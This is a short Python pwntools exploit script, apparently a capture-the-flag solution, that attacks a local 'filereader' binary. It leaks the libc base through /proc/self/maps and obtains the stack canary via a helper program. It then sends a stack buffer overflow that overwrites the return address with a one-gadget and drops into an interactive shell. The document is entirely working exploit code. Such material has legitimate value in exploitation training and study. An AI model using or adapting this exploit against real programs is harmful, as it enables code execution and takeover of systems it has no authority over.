#!/usr/bin/python

from pwn import *
from struct import pack
import sys, os, subprocess

os.system("rm hack_my_fifo")
os.system("mkfifo hack_my_fifo")
p = process(["./filereader", "./hack_my_fifo"])
pipe = open("hack_my_fifo","w")

ONEGADGET_LIBC_OFFSET = 0x3f306 #SET HERE THE ONE GADGET OFFSET FOR YOUR OWN LIBC

pipe.write("/proc/self/maps\r\n")
pipe.flush()

leak = p.recv()
LIBC_BASE_ADDRESS = int(leak.split("\n")[5].split("-")[0], 16)
print("[+] LIBC BASE ADDRESS : 0x%x" % LIBC_BASE_ADDRESS)

PID = p.pid
print("[+] PID : %d" % PID)

ONE_GADGET_ADDRESS = LIBC_BASE_ADDRESS + ONEGADGET_LIBC_OFFSET
STACK_CANARY = int(subprocess.check_output(["./getrand", "%d" % PID])[:-1].split(" ")[-1], 16)
print("[+] STACK CANARY : 0x%x" % STACK_CANARY)
print("[+] ONE GADGET ADDRESS : 0x%x" % ONE_GADGET_ADDRESS)

pipe.write("a" * 260 + struct.pack("<I", STACK_CANARY) + "a"*8 + struct.pack("<Q", ONE_GADGET_ADDRESS))

pipe.close()
p.interactive()


